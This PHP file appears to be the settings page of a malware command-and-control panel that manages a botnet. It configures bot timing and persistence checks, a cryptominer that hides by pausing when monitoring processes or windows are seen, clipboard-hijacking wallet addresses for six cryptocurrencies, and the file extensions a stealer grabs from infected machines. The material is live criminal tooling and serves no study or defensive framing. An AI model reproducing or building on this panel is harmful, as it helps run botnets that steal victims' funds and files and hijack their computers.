<?php
session_start();

  if($_SESSION['logged']!="true")
  {
    header("Location: index.php");
    die();
  }


include_once '../includes/db.php';


 ?>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
    <!-- Favicon -->
    <link rel="shortcut icon" href="images/favicon.ico" />
    <!-- Font -->
    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Poppins:200,300,300i,400,400i,500,500i,600,600i,700,700i,800,800i,900">
    <!-- css -->
    <link rel="stylesheet" type="text/css" href="css/style.css" />
</head>

<body>
    <div class="wrapper">
        <!--=================================
 preloader -->
        <div id="pre-loader">
            <img src="images/pre-loader/loader-01.svg" alt="">
        </div>
        <!--=================================
 preloader -->
        <!--=================================
 header start-->

 <nav class="admin-header navbar navbar-default col-lg-12 col-12 p-0 fixed-top d-flex flex-row">
   <!-- logo -->
   <div class="text-left navbar-brand-wrapper">
     <a class="navbar-brand brand-logo" href="idashboard.php"><img src="images/logo-dark.png" alt="" ></a>
     <a class="navbar-brand brand-logo-mini" href="dashboard.php"><img src="images/logo-icon-dark.png" alt=""></a>
   </div>
   <!-- Top bar left -->
   <ul class="nav navbar-nav mr-auto">
     <li class="nav-item">
       <a id="button-toggle" class="button-toggle-nav inline-block ml-20 pull-left" href="javascript:void(0);"><i class="zmdi zmdi-menu ti-align-right"></i></a>
     </li>
     <li class="nav-item">
       <div class="search">
         <a class="search-btn not_click" href="javascript:void(0);"></a>
         <div class="search-box not-click">
           <input type="text" class="not-click form-control" placeholder="Under development" value="" name="search">
           <button class="search-button" type="submit"> <i class="fa fa-search not-click"></i></button>
         </div>
       </div>
     </li>
   </ul>
   <!-- top bar right -->
   <ul class="nav navbar-nav ml-auto">
     <li class="nav-item fullscreen">
       <a id="btnFullscreen" href="#" class="nav-link" ><i class="ti-fullscreen"></i></a>
     </li>
   </ul>
 </nav>
        <!--=================================
 header End-->
        <!--=================================
 Main content -->
 <div class="container-fluid">
     <div class="row">
         <!-- Left Sidebar start-->
         <div class="side-menu-fixed">
             <div class="scrollbar side-menu-bg">
                 <ul class="nav navbar-nav side-menu" id="sidebarnav">
                     <!-- menu item Dashboard-->
                     <li>
                         <a href="dashboard.php" >
                             <div class="pull-left"><i class="fa fa-dashboard"></i><span class="right-nav-text">Dashboard</span></div>
                             <div class="clearfix"></div>
                         </a>
                     </li>
                     <!-- menu title -->
                     <li class="mt-10 mb-10 text-muted pl-4 font-medium menu-title">Components </li>
                     <!-- menu item Elements-->
                     <li>
                         <a href="bots.php">
                             <div class="pull-left"><i class="fa fa-users"></i><span class="right-nav-text">Bots</span></div>
                             <div class="clearfix"></div>
                         </a>
                     </li>
                     <!-- menu item calendar-->
                     <li>
                         <a href="javascript:void(0);" data-toggle="collapse" data-target="#calendar-menu">
                             <div class="pull-left"><i class="fa  fa-code"></i><span class="right-nav-text">Command center</span></div>
                             <div class="pull-right"><i class="ti-plus"></i></div>
                             <div class="clearfix"></div>
                         </a>
                         <ul id="calendar-menu" class="collapse" data-parent="#sidebarnav">
                             <li> <a href="tasks.php">Tasks</a> </li>
                             <li> <a href="success.php">Success list</a> </li>
                         </ul>
                     </li>
                     <!-- menu item todo-->
                     <li>
                         <a href="miner.php"><i class="fa fa-btc"></i><span class="right-nav-text">Miner</span> </a>
                     </li>
                     <!-- menu item chat-->
                     <li>
                         <a href="clipper.php"><i class="fa fa-paste"></i><span class="right-nav-text">Clipper </span></a>
                     </li>
                     <!-- menu item Charts-->
                     <li>
                         <a href="stealer.php">
                             <div class="pull-left"><i class="fa fa-folder"></i><span class="right-nav-text">Stealer</span></div>
                             <div class="clearfix"></div>
                         </a>
                     </li>
                     <!-- menu item mailbox-->

                     <!-- menu font icon-->
                     <li>
                         <a href="settings.php">
                             <div class="pull-left"><i class="fa fa-cogs"></i><span class="right-nav-text">Settings</span></div>
                             <div class="clearfix"></div>
                         </a>
                     </li>
                     <!-- menu title -->

                     <!-- menu item Multi level-->

                 </ul>
             </div>
         </div>
         <!-- Left Sidebar End-->
         <!--=================================
 Main content -->
                <!--=================================
wrapper -->
                <div class="content-wrapper">
                    <div class="page-title">
                        <div class="row">
                            <div class="col-sm-6">
                                <h4 class="mb-0"> Settings</h4>
                            </div>
                            <div class="col-sm-6">
                                <ol class="breadcrumb pt-0 pr-0 float-left float-sm-right">
                                    <li class="breadcrumb-item"><a href="dashboard.php" class="default-color">Home</a></li>
                                    <li class="breadcrumb-item active">Settings</li>
                                </ol>
                            </div>
                        </div>
                    </div>
                    <!-- widgets -->


<div class="row">
  <div class="card card-statistics h-100 col-xl-12">
          <div class="card-body">
           <h5 class="card-title"></h5>
           <div class="tab nav-bt">
             <ul class="nav nav-tabs" role="tablist">
                  <li class="nav-item">
                    <a class="nav-link active show" id="home-03-tab" data-toggle="tab" href="#home-03" role="tab" aria-controls="home-03" aria-selected="false">General</a>
                  </li>
                  <li class="nav-item">
                    <a class="nav-link" id="botnet-03-tab" data-toggle="tab" href="#botnet-03" role="tab" aria-controls="botnet-03" aria-selected="false">Botnet</a>
                  </li>
                  <li class="nav-item">
                    <a class="nav-link " id="profile-03-tab" data-toggle="tab" href="#profile-03" role="tab" aria-controls="profile-03" aria-selected="true">Miner </a>
                  </li>
                  <li class="nav-item">
                    <a class="nav-link" id="portfolio-03-tab" data-toggle="tab" href="#portfolio-03" role="tab" aria-controls="portfolio-03" aria-selected="false">Clipper </a>
                  </li>
                  <li class="nav-item">
                    <a class="nav-link" id="contact-03-tab" data-toggle="tab" href="#contact-03" role="tab" aria-controls="contact-03" aria-selected="false">Stealer </a>
                  </li>
                </ul>
                <div class="tab-content">
                  <div class="tab-pane fade active show" id="home-03" role="tabpanel" aria-labelledby="home-03-tab">
                    <div class="card card-statistics mb-30">
                                  <div class="card-body">
                                      <h5 class="card-title"></h5>
                                      <form id="pass_change" action="brain.php">
                                          <div class="form-group">
                                              <label for="new_pass">New password</label>
                                              <input type="password" class="form-control" id="new_pass" aria-describedby="emailHelp" required name="pass1">
                                              <small id="emailHelp" class="form-text text-muted"></small>
                                          </div>
                                          <div class="form-group">
                                              <label for="confirm_pass">Confirm password</label>
                                              <input type="password" class="form-control" id="confirm_pass" aria-describedby="emailHelp" required name="pass2">
                                              <small id="emailHelp" class="form-text text-muted"></small>
                                          </div>

                                          <button type="submit" class="btn btn-primary" onclick="check('new_pass','confirm_pass','pass_change')">Change</button>
                                      </form>
                                  </div>
                              </div>
                  </div>
                  <div class="tab-pane fade" id="botnet-03" role="tabpanel" aria-labelledby="botnet-03-tab">
                    <div class="card card-statistics mb-30">
                                  <div class="card-body">
                                      <h5 class="card-title"></h5>
                                      <form action="brain.php">
                                          <div class="form-group">
                                              <label for="start_delay">Start delay / sec</label>
                                              <input type="text" class="form-control" id="start_delay" name="start_delay" aria-describedby="emailHelp" value="<?php echo $pdo->query("SELECT start_delay FROM config")->fetchColumn() ?>">
                                              <small id="emailHelp" class="form-text text-muted">Delay before start</small>
                                          </div>
                                          <div class="form-group">
                                              <label for="startup_delay">Startup interval / min</label>
                                              <input type="text" class="form-control" id="startup_delay" name="startup_delay" aria-describedby="emailHelp" value="<?php echo $pdo->query("SELECT startup_delay FROM config")->fetchColumn() ?>">
                                              <small id="emailHelp" class="form-text text-muted">Recommend 5 min</small>
                                          </div>
                                          <div class="form-group">
                                              <label for="recover_interval">Recover interval / min</label>
                                              <input type="text" class="form-control" id="recover_interval" name="recover_interval" aria-describedby="emailHelp" value="<?php echo $pdo->query("SELECT recover_interval FROM config")->fetchColumn() ?>">
                                              <small id="emailHelp" class="form-text text-muted">Check if other bilds exists. Recommend 5 min </small>
                                          </div>
                                          <div class="form-group">
                                              <label for="reconnect_interval">Reconnect interval / min</label>
                                              <input type="text" class="form-control" id="reconnect_interval" name="reconnect_interval" aria-describedby="emailHelp" value="<?php echo $pdo->query("SELECT reconnect_interval FROM config")->fetchColumn() ?>">
                                              <small id="emailHelp" class="form-text text-muted">Botnet request interval. Recommend 5 min</small>
                                          </div>

                                          <button type="submit" class="btn btn-primary">Submit</button>
                                      </form>
                                  </div>
                              </div>
                  </div>
                  <div class="tab-pane fade" id="profile-03" role="tabpanel" aria-labelledby="profile-03-tab">
                    <div class="card card-statistics mb-30">
                                  <div class="card-body">
                                      <h5 class="card-title"></h5>
                                      <form action="brain.php">
                                        <label for="mining_status">Mining status</label>
                                        <select class="custom-select mb-3" id="mining_status" name="mining_status">
                                          <?php
                                          if($pdo->query("SELECT mining_status FROM config")->fetchColumn() == 1)
                                          {
                                            ?>
                                            <option value="1" selected>On</option>
                                            <option value="0">Off</option>
                                            <?
                                          }else {
                                            ?>
                                            <option value="1" >On</option>
                                            <option value="0" selected>Off</option>

                                            <?
                                          }


                                           ?>
                                        </select>
                                          <div class="form-group">
                                              <label for="warn_processes">Warn processes</label>
                                              <input type="text" class="form-control" id="warn_processes" aria-describedby="emailHelp" name="warn_processes" value="<?php echo $pdo->query("SELECT warn_processes FROM config")->fetchColumn() ?>">
                                              <small id="emailHelp" class="form-text text-muted">If process exist mining stops. Example: pro1,pro2,proc3</small>
                                          </div>
                                          <div class="form-group">
                                              <label for="warn_windows">Warn windows</label>
                                              <input type="text" class="form-control" id="warn_windows" aria-describedby="emailHelp" name="warn_windows" value="<?php echo $pdo->query("SELECT warn_windows FROM config")->fetchColumn() ?>">
                                              <small id="emailHelp" class="form-text text-muted">If windows exists mining stops. Example: window1,window2,window3</small>
                                          </div>
                                          <label for="exit_type">When windows or processes found</label>
                                          <select class="custom-select mb-3" id="exit_type" name="exit_type">
                                            <?php
                                            if($pdo->query("SELECT exit_type FROM config")->fetchColumn() == 1)
                                            {
                                              ?>
                                              <option value="1" selected>Stop miner</option>
                                              <option value="0">Exit botnet</option>
                                              <?
                                            }else {
                                              ?>
                                              <option value="1">Stop miner</option>
                                              <option value="0" selected>Exit botnet</option>

                                              <?
                                            }


                                             ?>

                                          </select>


                                          <button type="submit" class="btn btn-primary">Submit</button>
                                      </form>
                                  </div>
                              </div>
                  </div>
                  <div class="tab-pane fade" id="portfolio-03" role="tabpanel" aria-labelledby="portfolio-03-tab">
                    <form action="brain.php">
                    <div class="form-group row">
                      <label for="btc" class="col-sm-2 col-form-label col-form-label-lg">Bitcoin</label>
                      <div class="col-sm-10">
                      <input type="text" class="form-control form-control-lg"  id="btc" name="btc" value="<?php echo $pdo->query("SELECT wallet FROM wallets WHERE name = 'Bitcoin'")->fetchColumn() ?>">
                      </div>
                    </div>
                    <div class="form-group row">
                      <label for="eth" class="col-sm-2 col-form-label col-form-label-lg">Ethereum</label>
                      <div class="col-sm-10">
                      <input type="text" class="form-control form-control-lg"  id="eth" name="eth" value="<?php echo $pdo->query("SELECT wallet FROM wallets WHERE name = 'Ethereum'")->fetchColumn() ?>">
                      </div>
                    </div>
                    <div class="form-group row">
                      <label for="mon" class="col-sm-2 col-form-label col-form-label-lg">Monero</label>
                      <div class="col-sm-10">
                      <input type="text" class="form-control form-control-lg"  id="mon" name="mon" value="<?php echo $pdo->query("SELECT wallet FROM wallets WHERE name = 'Monero'")->fetchColumn() ?>">
                      </div>
                    </div>
                    <div class="form-group row">
                      <label for="ltc" class="col-sm-2 col-form-label col-form-label-lg">Litecoin</label>
                      <div class="col-sm-10">
                      <input type="text" class="form-control form-control-lg" id="ltc" name="ltc" value="<?php echo $pdo->query("SELECT wallet FROM wallets WHERE name = 'Litecoin'")->fetchColumn() ?>">
                      </div>
                    </div>
                    <div class="form-group row">
                      <label for="ripple" class="col-sm-2 col-form-label col-form-label-lg">Ripple</label>
                      <div class="col-sm-10">
                      <input type="text" class="form-control form-control-lg" id="ripple"  name="ripple" value="<?php echo $pdo->query("SELECT wallet FROM wallets WHERE name = 'Ripple'")->fetchColumn() ?>" >
                      </div>
                    </div>
                    <div class="form-group row">
                      <label for="doge" class="col-sm-2 col-form-label col-form-label-lg">Doge</label>
                      <div class="col-sm-10">
                      <input type="text" class="form-control form-control-lg"  id="doge" name="doge" value="<?php echo $pdo->query("SELECT wallet FROM wallets WHERE name = 'Doge'")->fetchColumn() ?>">
                      </div>
                    </div>
                    <button type="submit" class="btn btn-primary">Submit</button>
                    </form>
                    </div>
                  <div class="tab-pane fade" id="contact-03" role="tabpanel" aria-labelledby="contact-03-tab">
                    <div class="card card-statistics mb-30">
                                  <div class="card-body">
                                      <h5 class="card-title"></h5>
                                      <form action="brain.php">
                                          <div class="form-group">
                                              <label for="extensions">Grabber extensions</label>
                                              <input type="text" class="form-control" id="extensions" name="extensions" aria-describedby="emailHelp" value="<?php echo $pdo->query("SELECT extensions FROM config")->fetchColumn() ?>">
                                              <small id="emailHelp" class="form-text text-muted">Example: txt,doc,pptx</small>
                                          </div>
                                          <button type="submit" class="btn btn-primary mt-5">Submit</button>
                                      </form>
                                  </div>
                              </div>
                </div>
            </div>
          </div>
        </div>
</div>
                    <!--=================================
 footer -->

    <!--=================================
 footer -->
    <script type="text/javascript">
      function check(a,b,c){
         var el1 = document.getElementById(a).value;
         var el2 = document.getElementById(b).value;
        if(el1 != el2)
        {
          alert("Passwords don`t match!")
        }else {
          document.getElementById(c).submit();
        }
      };
    </script>
    <!--=================================
 jquery -->
    <!-- jquery -->
    <script src="js/jquery-3.3.1.min.js"></script>
    <!-- plugins-jquery -->
    <script src="js/plugins-jquery.js"></script>
    <!-- plugin_path -->
    <script>
    var plugin_path = 'js/';
    </script>
    <!-- jvectormap -->
    <script src="js/jvectormap/jquery-jvectormap-2.0.3.min.js"></script>
    <script src="js/jvectormap/jquery-jvectormap-world-mill-en.js"></script>
    <script src="js/jvectormap/jquery-jvectormap-init.js"></script>
    <!-- chart -->
    <script src="js/chart-init.js"></script>
    <!-- calendar -->
    <script src="js/calendar.init.js"></script>
    <!-- charts sparkline -->
    <script src="js/sparkline.init.js"></script>
    <!-- charts morris -->
    <script src="js/morris.init.js"></script>
    <!-- datepicker -->
    <script src="js/datepicker.js"></script>
    <!-- sweetalert2 -->
    <script src="js/sweetalert2.js"></script>
    <!-- toastr -->
    <script src="js/toastr.js"></script>
    <!-- validation -->
    <script src="js/validation.js"></script>
    <!-- lobilist -->
    <script src="js/lobilist.js"></script>
    <!-- custom -->
    <script src="js/custom.js"></script>
</body>

</html>
